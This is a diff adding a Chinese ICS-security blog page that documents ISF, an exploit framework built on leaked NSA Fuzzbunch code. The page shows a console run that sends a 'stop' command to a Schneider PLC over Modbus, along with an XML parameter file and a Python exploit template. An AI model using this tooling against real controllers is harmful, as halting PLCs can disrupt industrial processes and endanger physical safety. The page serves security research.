@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:og="http://ogp.me/ns#"
+      xmlns:fb="https://www.facebook.com/2008/fbml">
+<head>
+    <title>工控漏洞利用框架 - ISF(Industrial Security Framework) - 工匠安全实验室 | 专注于工控安全</title>
+    <!-- Using the latest rendering mode for IE -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+
+    <!-- Open Graph tags -->
+            <meta property="og:type" content="article"/>
+            <meta property="og:title" content="工控漏洞利用框架 - ISF(Industrial Security Framework)"/>
+            <meta property="og:url" content="../tool/isf.html"/>
+            <meta property="og:description" content="一、 框架介绍 本框架主要使用Python语言开发，通过集成ShadowBroker释放的NSA工具Fuzzbunch攻击框架，开发一款适合工控漏洞利用的框架。由于Fuzzbunch攻击框架仅适用于Python2.6，很多核心的功能都封装成了DLL，通过函数进行调用，不便于后期的移植和使用。但是，Fuzzbunch的命令行使用的确很方便，而且够傻瓜，所以就有集成一个适合工控漏洞利用的框架想法。新框架对主要的接口使用Python重新实现 ..."/>
+
+    <meta name="description" content="专注于工控网络安全、物联网安全、基础设施安全。" />
+    <meta name="keywords" content="工控安全,工匠安全实验室,工控网络安全,物联网安全,基础设施安全,工控安全导航,ics,scada,ics security,scada security" />
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="../theme/css/bootstrap.min.css" type="text/css"/>
+    <!-- <link href="http://cdn.bootcss.com/bootstrap/3.1.0/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>   -->
+    <link href="../theme/css/font-awesome.min.css" rel="stylesheet">
+
+    <link href="../theme/css/pygments/emacs.css" rel="stylesheet">
+    <link rel="stylesheet" href="../theme/css/style.css" type="text/css"/>
+
+        <link href="../feed.xml" type="application/rss+xml" rel="alternate"
+              title="工匠安全实验室 | 专注于工控安全 RSS Feed"/>
+
+    <link href="../theme/css/github-markdown.css" rel="stylesheet">
+
+</head>
+<body>
+
+<div class="navbar navbar-default navbar-fixed-top myheader" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+
+            <a href="../" class="navbar-brand">
+<img src="../logo.png" width="40" height="40"/>             </a>
+                <div class="brand" id="titlename">工匠安全实验室</div>
+        </div>
+        <div class="collapse navbar-collapse navbar-ex1-collapse navbar-right">
+            <ul class="nav navbar-nav">
+                    <li><a href="http://icsmaster.com/index.html">首页</a></li>
+                    <li><a href="http://icsmaster.com/category/news.html">最新资讯</a></li>
+                    <li><a href="http://icsmaster.com/category/security.html">安全研究</a></li>
+                    <li><a href="http://icsmaster.com/category/tool.html">开源工具</a></li>
+                    <li><a href="http://icsmaster.com/nav.html">工控安全导航</a></li>
+                    <li><a href="http://icsmaster.com/other/about.html">关于我们</a></li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right">
+                <!--
+<li class="banner">
+    <a title="网速较慢的话请耐心等待~" href='javascript:(function(){function c(){var e=document.createElement("link");e.setAttribute("type","text/css");e.setAttribute("rel","stylesheet");e.setAttribute("href",f);e.setAttribute("class",l);document.body.appendChild(e)}function h(){var e=document.getElementsByClassName(l);for(var t=0;t<e.length;t++){document.body.removeChild(e[t])}}function p(){var e=document.createElement("div");e.setAttribute("class",a);document.body.appendChild(e);setTimeout(function(){document.body.removeChild(e)},100)}function d(e){return{height:e.offsetHeight,width:e.offsetWidth}}function v(i){var s=d(i);return s.height>e&&s.height<n&&s.width>t&&s.width<r}function m(e){var t=e;var n=0;while(!!t){n+=t.offsetTop;t=t.offsetParent}return n}function g(){var e=document.documentElement;if(!!window.innerWidth){return window.innerHeight}else if(e&&!isNaN(e.clientHeight)){return e.clientHeight}return 0}function y(){if(window.pageYOffset){return window.pageYOffset}return Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function E(e){var t=m(e);return t>=w&&t<=b+w}function S(){var e=document.createElement("audio");e.setAttribute("class",l);e.src=i;e.loop=false;e.addEventListener("canplay",function(){setTimeout(function(){x(k)},500);setTimeout(function(){N();p();for(var e=0;e<O.length;e++){T(O[e])}},15500)},true);e.addEventListener("ended",function(){N();h()},true);e.innerHTML=" <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>";document.body.appendChild(e);e.play()}function x(e){e.className+=" "+s+" "+o}function T(e){e.className+=" "+s+" "+u[Math.floor(Math.random()*u.length)]}function N(){var e=document.getElementsByClassName(s);var t=new RegExp("\\b"+s+"\\b");for(var n=0;n<e.length;){e[n].className=e[n].className.replace(t,"")}}var e=30;var t=30;var n=350;var r=350;var i="//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3";var s="mw-harlem_shake_me";var o="im_first";var u=["im_drunk","im_baked","im_trippin","im_blown"];var a="mw-strobe_light";var f="//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css";var l="mw_added_css";var b=g();var w=y();var C=document.getElementsByTagName("*");var k=null;for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){if(E(A)){k=A;break}}}if(A===null){console.warn("Could not find a node of the right size. Please try a different page.");return}c();S();var O=[];for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){O.push(A)}}})()'>High一下!</a>
+</li>                -->
+                <li><a href="../archives.html"><i class="fa fa-th-list"></i><span class="icon-label">归档</span></a></li>
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+</div> <!-- /.navbar -->
+
+<div class="container">
+    <div class="row">
+        <div class="col-sm-9">
+
+   <div class="article-content">
+    <section id="content">
+        <article>
+        <div class="panel panel-default">
+            <header class="page-header">
+                <h1 class="article-title">
+                        工控漏洞利用框架 - ISF(Industrial Security Framework)
+                    </a>
+                </h1>
+
+                <div class="entry-content">
+                    <div class="panel-body">
+﻿<footer class="article-meta">
+
+	<span class="item name">
+            <!-- <span class="label label-default">By</span> -->
+            <!-- <a href="../author/w3h.html"><i class="fa fa-user"></i> [<Author u'w3h'>]</a> -->
+			
+            <i class="fa fa-user"></i><a href="../author/w3h.html">  w3h </a> &nbsp;
+			
+	</span>
+	
+	<span class="item time">
+	 <span class="published">
+        <i class="fa fa-calendar"></i><time datetime="2017-07-04T14:36:00+08:00"> 2017-10-31 15:03:36</time>
+    </span>  
+	</span>	
+
+
+	<span class="item tag">
+<!-- <span class="label label-default">Tags</span> -->
+<a href="../tag/isf.html"><span class="label label-default"> isf </span></a>
+	</span>
+	
+    
+</footer><!-- /.post-info -->                    </div>
+                </div>                  
+            </header>
+
+            <div class="entry-content markdown-body">
+                <div class="panel-body">
+                    <h2>一、    框架介绍</h2>
+<p>本框架主要使用Python语言开发，通过集成ShadowBroker释放的NSA工具Fuzzbunch攻击框架，开发一款适合工控漏洞利用的框架。由于Fuzzbunch攻击框架仅适用于Python2.6，很多核心的功能都封装成了DLL，通过函数进行调用，不便于后期的移植和使用。但是，Fuzzbunch的命令行使用的确很方便，而且够傻瓜，所以就有集成一个适合工控漏洞利用的框架想法。新框架对主要的接口使用Python重新实现，所以支持Python2.X版本。</p>
+<p>肯定会有人问，有牛逼的MSF，搞这个玩竟儿有什么用？主要基于如下几点考虑</p>
+<ul>
+<li>MSF命令行使用不够傻瓜，纯属个人观点，仅供参考。</li>
+<li>工控的很多私用协议都使用Python开发，有很多优秀的Python框架（如scapy、kitty），集成在MSF很麻烦，有一个Python的框架会方便很多。</li>
+<li>最主要的一个原因是，从事工控安全以来，本人一直在使用Python，很多脚本都是基于Python开发的，想将手上所有的资源进行整合，提供一个统一的平台，方便。</li>
+</ul>
+<h2>二、    框架使用</h2>
+<p>进入目录，执行如下命令：</p>
+<div class="highlight"><pre>python main.py
+</pre></div>
+
+
+<p>界面显示如下：</p>
+<div class="highlight"><pre>D:\isf\isf&gt;python main.py
+
+                               ???
+                         ???????????????
+                      ?????           ?????
+                   ????                   ????
+                 ????                       ????
+                ???                           ???
+               ???             ??              ???
+              ???           ????????            ???
+             ???           ???????????           ???
+             ???          ?????????????          ???
+             ??          ???????????????          ??
+             ??         ?????????????????         ??
+             ??        ??????       ?????         ??
+             ??            ???????????            ??
+             ??            ???????????            ??
+             ??             ?????????             ??
+             ???             ???????             ???
+             ???              ?????              ???
+              ???          ???????????          ???
+               ???      ?????????????????      ???
+                ???   ????????????????????    ???
+                  ?????????????????????????????
+                   ???????????????????????????
+                      ?????????????????????
+                         ---ICSMASTER---
+
++ - - - - - + [ Version 1.1.1                           ] + - - - - - +
++ - - - - - + [ MADE BY ICSMASTER. HTTP://ICSMASTER.COM ] + - - - - - +
+
+[*] Loading Plugins
+[*] Initializing isf v1.1.1
+[*] Adding Global Variables
+[+] Set ResourcesDir =&gt;. c:\isf\Resources
+[+] Set Color =&gt;. True
+[+] Set ShowHiddenParameters =&gt;. False
+[+] Set NetworkTimeout =&gt;. 60
+[+] Set LogDir =&gt;. D:\isf\isf\logs
+[*] Autorun ON
+
+Exploit Autorun List
+====================
+
+  0) apply
+  1) touch all
+  2) prompt confirm
+  3) execute
+
+
+Payload Autorun List
+====================
+
+  0) apply
+  1) prompt confirm
+  2) execute
+
+
+[+] Set ISFStorage =&gt;. D:\isf\isf\storage
+isf &gt;
+</pre></div>
+
+
+<p>show命令使用，显示当前所有的插件，如下所示</p>
+<div class="highlight"><pre>isf &gt; show
+
+Plugin Categories
+=================
+
+  Category     Active Plugin
+  --------     -------------
+  Exploit      None
+  Payload      None
+
+isf &gt; show Exploit
+
+Plugin Category: Exploit
+========================
+
+  Name                            Version
+  ----                            -------
+  Schneider_CPU_Command           1.1.0
+  Siemens_300_400_CPU_Control     1.1.0
+</pre></div>
+
+
+<p>use命令使用，调用相关插件，并根据命令行提示配置参数，如下所示</p>
+<div class="highlight"><pre><span class="n">isf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">Schneider_CPU_Command</span>
+
+<span class="o">[</span><span class="p">!</span><span class="o">]</span> <span class="n">Entering</span> <span class="n">Plugin</span> <span class="n">Context</span> <span class="p">::</span> <span class="n">Schneider_CPU_Command</span>
+<span class="o">[*]</span> <span class="n">Applying</span> <span class="k">Global</span> <span class="n">Variables</span>
+
+<span class="o">[*]</span> <span class="n">Applying</span> <span class="n">Session</span> <span class="n">Parameters</span>
+<span class="o">[*]</span> <span class="n">Running</span> <span class="n">Exploit</span> <span class="n">Touches</span>
+
+
+<span class="o">[</span><span class="p">!</span><span class="o">]</span> <span class="n">Enter</span> <span class="n">Prompt</span> <span class="n">Mode</span> <span class="p">::</span> <span class="n">Schneider_CPU_Command</span>
+
+<span class="n">Module</span><span class="p">:</span> <span class="n">Schneider_CPU_Command</span>
+<span class="o">=============================</span>
+
+  <span class="n">Name</span>            <span class="n">Value</span>
+  <span class="o">----</span>            <span class="o">-----</span>
+  <span class="n">TargetIp</span>
+  <span class="n">TargetPort</span>      <span class="mi">502</span>
+  <span class="n">Command</span>         <span class="k">stop</span>
+
+<span class="o">[</span><span class="p">!</span><span class="o">]</span> <span class="n">plugin</span> <span class="n">variables</span> <span class="n">are</span> <span class="n">valid</span>
+<span class="o">[</span><span class="err">?</span><span class="o">]</span> <span class="n">Prompt</span> <span class="k">For</span> <span class="n">Variable</span> <span class="n">Settings</span><span class="err">?</span> <span class="o">[</span><span class="n">Yes</span><span class="o">]</span> <span class="p">:</span>
+
+<span class="o">[*]</span>  <span class="n">TargetIp</span> <span class="p">::</span> <span class="n">Target</span> <span class="n">IP</span> <span class="n">Address</span>
+
+<span class="o">[</span><span class="err">?</span><span class="o">]</span> <span class="n">TargetIp</span> <span class="o">[]</span> <span class="p">:</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.30</span>
+<span class="o">[+]</span> <span class="k">Set</span> <span class="n">TargetIp</span> <span class="o">=&gt;</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.30</span>
+
+<span class="o">[*]</span>  <span class="n">TargetPort</span> <span class="p">::</span> <span class="n">Target</span> <span class="n">Port</span>
+
+<span class="o">[</span><span class="err">?</span><span class="o">]</span> <span class="n">TargetPort</span> <span class="o">[</span><span class="mi">502</span><span class="o">]</span> <span class="p">:</span>
+<span class="o">[+]</span> <span class="k">Set</span> <span class="n">TargetPort</span> <span class="o">=&gt;</span> <span class="mi">502</span>
+
+<span class="o">[*]</span>  <span class="n">Command</span> <span class="p">::</span> <span class="n">The</span> <span class="n">control</span> <span class="n">command</span> <span class="k">of</span> <span class="n">cpu</span> <span class="o">[</span><span class="k">stop</span><span class="o">/</span><span class="n">start</span><span class="o">]</span>
+
+<span class="o">[</span><span class="err">?</span><span class="o">]</span> <span class="n">Command</span> <span class="o">[</span><span class="k">stop</span><span class="o">]</span> <span class="p">:</span>
+<span class="o">[+]</span> <span class="k">Set</span> <span class="n">Command</span> <span class="o">=&gt;</span> <span class="k">stop</span>
+
+
+<span class="o">[</span><span class="p">!</span><span class="o">]</span> <span class="n">Preparing</span> <span class="k">to</span> <span class="n">Execute</span> <span class="n">Schneider_CPU_Command</span>
+
+<span class="n">Module</span><span class="p">:</span> <span class="n">Schneider_CPU_Command</span>
+<span class="o">=============================</span>
+
+  <span class="n">Name</span>            <span class="n">Value</span>
+  <span class="o">----</span>            <span class="o">-----</span>
+  <span class="n">TargetIp</span>        <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.30</span>
+  <span class="n">TargetPort</span>      <span class="mi">502</span>
+  <span class="n">Command</span>         <span class="k">stop</span>
+
+<span class="o">[</span><span class="err">?</span><span class="o">]</span> <span class="n">Execute</span> <span class="n">Plugin</span><span class="err">?</span> <span class="o">[</span><span class="n">Yes</span><span class="o">]</span> <span class="p">:</span>
+<span class="o">[*]</span> <span class="n">Executing</span> <span class="n">Plugin</span>
+<span class="n">logging</span> <span class="k">to</span> <span class="n">file</span>
+<span class="o">[+]</span> <span class="n">Schneider_CPU_Command</span> <span class="n">Succeeded</span>
+</pre></div>
+
+
+<h2>三、    EXP编写</h2>
+<p>编写一个EXP需要包含两个文件，一个参数描述性的文件 <em>.xml 和 一个漏洞脚本文件 </em>.py，两个文件的名字需要相同，xml定义输入输出的参数的基本信息，如下所示，EXP需要三个参数，分别是TargetIp、TargetPort、Command。注意：XML文件中 name 字段不能重复。</p>
+<div class="highlight"><pre><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="nt">&lt;t:config</span> <span class="na">id=</span><span class="s">&quot;c72514379eaad943b62f4080a5ae1dc61619f0f3&quot;</span>
+          <span class="na">name=</span><span class="s">&quot;Schneider_CPU_Command&quot;</span>
+          <span class="na">version=</span><span class="s">&quot;1.1.0&quot;</span>
+          <span class="na">configversion=</span><span class="s">&quot;1.1.0.0&quot;</span>
+          <span class="na">xmlns:xsi=</span><span class="s">&#39;http://www.w3.org/2001/XMLSchema-instance&#39;</span>
+          <span class="na">xmlns:t=</span><span class="s">&#39;tc0&#39;</span><span class="nt">&gt;</span>
+
+  <span class="nt">&lt;t:inputparameters&gt;</span>    
+    <span class="nt">&lt;t:parameter</span> <span class="na">name=</span><span class="s">&quot;TargetIp&quot;</span>
+                 <span class="na">description=</span><span class="s">&quot;Target IP Address&quot;</span>
+                 <span class="na">type=</span><span class="s">&quot;IPv4&quot;</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;t:parameter</span> <span class="na">name=</span><span class="s">&quot;TargetPort&quot;</span>
+                 <span class="na">description=</span><span class="s">&quot;Target Port&quot;</span>
+                 <span class="na">type=</span><span class="s">&quot;TcpPort&quot;</span>
+                 <span class="na">default=</span><span class="s">&quot;502&quot;</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;t:parameter</span> <span class="na">name=</span><span class="s">&quot;Command&quot;</span>
+                 <span class="na">description=</span><span class="s">&quot;The control command of cpu [stop/start]&quot;</span>
+                 <span class="na">type=</span><span class="s">&quot;String&quot;</span>
+                 <span class="na">default=</span><span class="s">&quot;stop&quot;</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/t:inputparameters&gt;</span>
+<span class="nt">&lt;/t:config&gt;</span>
+</pre></div>
+
+
+<p>漏洞利用脚本编写方法如下，如果不清楚可以直接拷贝如下模板进行修改</p>
+<blockquote>
+<p>1、继承基础类 BaseExploit 
+2、填写POC基础信息 pocinfo
+3、注册命令行，向register_options变量增加make_option对象即可，注意参数名称需要与xml文件保持一致
+4、实现exploit函数</p>
+</blockquote>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39</pre></div></td><td class="code"><div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>
+<span class="c"># coding=utf-8</span>
+<span class="kn">from</span> <span class="nn">core.exploit</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="k">class</span> <span class="nc">MyPoc</span><span class="p">(</span><span class="n">BaseExploit</span><span class="p">):</span>
+    <span class="n">pocinfo</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">&#39;ID&#39;</span><span class="p">:</span> <span class="s">&#39;ICF-2017-000001&#39;</span><span class="p">,</span>
+        <span class="s">&#39;Name&#39;</span><span class="p">:</span> <span class="s">&#39;施耐德昆腾140系列PLC CPU控制&#39;</span><span class="p">,</span>
+        <span class="s">&#39;Author&#39;</span><span class="p">:</span> <span class="s">&#39;w3h&#39;</span><span class="p">,</span>
+        <span class="s">&#39;Create_Date&#39;</span><span class="p">:</span> <span class="s">&#39;2017-04-09&#39;</span><span class="p">,</span>
+        <span class="s">&#39;Description&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;&#39;施耐德昆腾140系列PLC认证用户时Session使用是单比特，导致攻击者可以向PLC发送CPU控制指令。&#39;&#39;&#39;</span><span class="p">,</span>
+
+        <span class="s">&#39;Vendor&#39;</span><span class="p">:</span> <span class="n">VENDOR</span><span class="o">.</span><span class="n">SI</span><span class="p">,</span>
+        <span class="s">&#39;Device&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s">&#39;Schneider Quantum 140&#39;</span><span class="p">],</span>
+        <span class="s">&#39;App&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span><span class="p">,</span>
+        <span class="s">&#39;Protocol&#39;</span><span class="p">:</span> <span class="s">&#39;modbus&#39;</span><span class="p">,</span>
+        <span class="s">&#39;References&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s">&#39;CVE&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;CNVD&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;OSVDB&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;CNNVD&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span><span class="p">},</span>
+
+        <span class="s">&#39;Risk&#39;</span><span class="p">:</span> <span class="n">RISK</span><span class="o">.</span><span class="n">H</span><span class="p">,</span>  <span class="c"># H/M/L</span>
+        <span class="s">&#39;VulType&#39;</span><span class="p">:</span> <span class="n">VULTYPE</span><span class="o">.</span><span class="n">REP</span>
+    <span class="p">}</span>
+
+    <span class="n">register_options</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">make_option</span><span class="p">(</span><span class="s">&#39;--TargetIp&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">&#39;store&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">&#39;TargetIp&#39;</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="s">&#39;string&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;The target of this poc.&#39;</span><span class="p">),</span>
+        <span class="n">make_option</span><span class="p">(</span><span class="s">&#39;--TargetPort&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">&#39;store&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">&#39;TargetPort&#39;</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="s">&#39;int&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">502</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;The port of this poc [default:502].&#39;</span><span class="p">),</span>
+        <span class="n">make_option</span><span class="p">(</span><span class="s">&#39;--Command&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;The constrol commond of cpu&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">&quot;Command&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">&quot;stop&quot;</span><span class="p">),</span>
+    <span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">getParam</span><span class="p">(</span><span class="s">&quot;Command&quot;</span><span class="p">)</span>
+        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="bp">self</span><span class="o">.</span><span class="n">TargetIp</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">TargetPort</span><span class="p">))</span>
+        <span class="k">pass</span>
+
+<span class="c"># POC标准入口函数</span>
+<span class="n">MainEntry</span><span class="p">(</span><span class="n">MyPoc</span><span class="p">,</span> <span class="n">__name__</span><span class="p">)</span>
+</pre></div>
+</td></tr></table>
+                </div>
+            </div>  
+  
+            <div class="panel-body">
+
+<!-- JiaThis Button BEGIN -->
+<script type="text/javascript" >
+var jiathis_config={
+	data_track_clickback:true,
+	siteNum:5,
+	sm:"weixin,tqq,qzone,tsina,cqq",
+	summary:"",
+	showClose:true,
+	shortUrl:true,
+	hideMore:true
+}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jiathis_r.js?uid=2128692&type=left&btn=l5.gif&move=1" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+
+    <div>
+        <br />
+        <hr />
+        <ul>
+            <li>
+                <a href="../security/wincc_env.html">
+                    上一篇文章：基于WinCC多协议通信实验环境搭建
+                </a>
+            </li>
+            <li>
+                <a href="../security/plcinjecter.html">
+                    下一篇文章：利用Modbus PLC作为攻击载荷分发系统
+                </a>
+            </li>
+        </ul>
+    </div>
+            </div>
+        </div>
+
+        <div class="panel panel-default">
+            <div class="panel-body">
+                <!-- /.entry-content -->
+<!-- UY BEGIN -->
+<div id="uyan_frame"></div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2138476"></script>
+<!-- UY END -->
+            </div>
+        </div>    
+        </article>
+    </section>
+	</div>
+        </div>
+        <div class="col-sm-3" id="sidebar">
+<div class="sidebar_main">
+<div class="well well-sm" id="sidebar">
+<aside>
+    <section>
+        <ul class="list-group list-group-flush">
+                <li class="list-group-item">
+                <div>
+                    <h4><i class="fa fa-home fa-lg"></i><span class="icon-label">近期文章</span></h4>
+                </div>
+                    <ul class="list-group" id="recentposts">
+                        <li class="list-group-item">               
+                            <a href="../security/Triton_src_analysis.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> Triton核心源代码分析
+                            </a>
+                        </li>
+                        <li class="list-group-item">               
+                            <a href="../security/s7_300_1212C_1215C TRCV_compare.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> S7-300/1200TRCV变长度接收
+                            </a>
+                        </li>
+                        <li class="list-group-item">               
+                            <a href="../news/monthly_report_12_2.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> 工控安全半月报第五期（2017-12 下）
+                            </a>
+                        </li>
+                        <li class="list-group-item">               
+                            <a href="../news/hk_conference.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> 工匠安全实验室受邀赴港参加DragonCon2017会议
+                            </a>
+                        </li>
+                        <li class="list-group-item">               
+                            <a href="../news/monthly_report_12_1.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> 工控安全半月报第四期（2017-12 上）
+                            </a>
+                        </li>
+                        <li class="list-group-item">               
+                            <a href="../news/monthly_report_11_2.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> 工控安全半月报第三期（2017-11 下）
+                            </a>
+                        </li>
+                        <li class="list-group-item">               
+                            <a href="../news/monthly_report_11_1.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> 工控安全半月报第二期（2017-11 上）
+                            </a>
+                        </li>
+                        <li class="list-group-item">               
+                            <a href="../security/virtual_platform.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> 工业系统虚拟化测试平台搭建
+                            </a>
+                        </li>
+                        <li class="list-group-item">               
+                            <a href="../news/monthly_report_10_2.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> 工控安全半月报第一期（2017-10）
+                            </a>
+                        </li>
+                        <li class="list-group-item">               
+                            <a href="../tool/AB_VPLC.html">
+                               <span class="glyphicon glyphicon-volume-down"></span> 构建虚拟工控环境系列 - 罗克韦尔虚拟PLC
+                            </a>
+                        </li>
+                    </ul>
+                </li>
+    </section>            
+</aside>
+</div> 
+</div> 
+
+<div class="sidebar_main">
+<div class="well well-sm" id="sidebar">
+<aside>
+    <section>
+
+    <li class="list-group-item"><h4><i class="fa fa-tags fa-lg"></i><span class="icon-label">最新评论</span></h4></a>
+    <!-- UYAN NEW COMMENT BEGIN -->
+    <div id="uyan_newcmt_unit"></div>
+    <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2128692"></script> <!-- 如果已经过加载此行JS，即可不用重复加载 -->
+    <!-- UYAN NEW COMMENT END -->
+    </li>
+    </section>            
+</aside>
+</div> 
+</div> 
+
+<div class="sidebar_main">
+<div class="well well-sm" id="sidebar">
+<aside>
+    <section>
+
+    <li class="list-group-item"><h4><i class="fa fa-github fa-lg"></i><span class="icon-label">GitHub</span></h4>
+        <div id="gh_repos">
+            <p class="list-group-item">Status updating...</p>
+        </div>
+    </li>
+    </section>            
+</aside>
+</div> 
+</div> 
+
+<div class="sidebar_main">
+<div class="well well-sm" id="sidebar">
+<aside>
+    <section>
+    <li class="list-group-item"><h4><i class="fa fa-external-link-square fa-lg"></i><span class="icon-label">友情链接</span></h4>
+      <ul class="list-group" id="links">
+        <li class="list-group-item">
+            <a href="http://dragoncon.hk/" target="_blank">
+                DRAGONCON
+            </a>
+        </li>
+        <li class="list-group-item">
+            <a href="http://www.waitalone.cn/" target="_blank">
+                独自等待
+            </a>
+        </li>
+        <li class="list-group-item">
+            <a href="http://plcscan.org/blog/" target="_blank">
+                灯塔实验室
+            </a>
+        </li>
+      </ul>
+    </li>
+    </section>            
+</aside>
+</div> 
+</div>    
+        </div>
+    </div>
+</div>
+<footer class="myfooter">
+   <div class="container">
+      <div class="row">
+         <div class="col-xs-10">&copy; 2018 W3H
+            <a href="http://docs.getpelican.com/" target="_blank">Pelican</a>,
+            <a href="http://getbootstrap.com" target="_blank">Bootstrap</a>         </div>
+         <div class="col-xs-2"><p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#" id="pull-right-link">Back to top</a></p></div>
+      </div>
+   </div>
+</footer>
+
+
+<script type="text/javascript">
+    if(document.body.scrollWidth < 700){
+      document.getElementById('pull-right-link').style.display = 'none';
+    }
+</script>
+<script src="http://code.jquery.com/jquery.js"></script>
+<!-- <script src="http://cdn.bootcss.com/bootstrap/3.1.0/js/bootstrap.min.js"></script>  -->
+<script src="../theme/js/bootstrap.min.js"></script>
+
+<!-- Enable responsive features in IE8 with Respond.js (https://github.com/scottjehl/Respond) -->
+<script src="../theme/js/respond.min.js"></script>
+
+<!-- For the Tags Cloud -->
+<script type="text/javascript">
+if(document.body.scrollWidth < 1024){
+      document.getElementById("titlename").innerHTML="工匠安全实验室";
+}
+</script>
+
+    <!-- GitHub JS -->
+    <script type="text/javascript">
+        $(document).ready(function () {
+            if (!window.jXHR) {
+                var jxhr = document.createElement('script');
+                jxhr.type = 'text/javascript';
+                jxhr.src = '../theme/js/jXHR.js';
+                var s = document.getElementsByTagName('script')[0];
+                s.parentNode.insertBefore(jxhr, s);
+            }
+
+            github.showRepos({
+                user: 'w3h',
+                count: 5,
+                skip_forks: false,
+                target: '#gh_repos'
+            });
+        });
+    </script>
+    <script src="../theme/js/github.js" type="text/javascript"></script>
+    <!-- End GitHub JS Code -->
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8dd91be64f13d3df23dfc64664c3101b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+</body>
+</html>
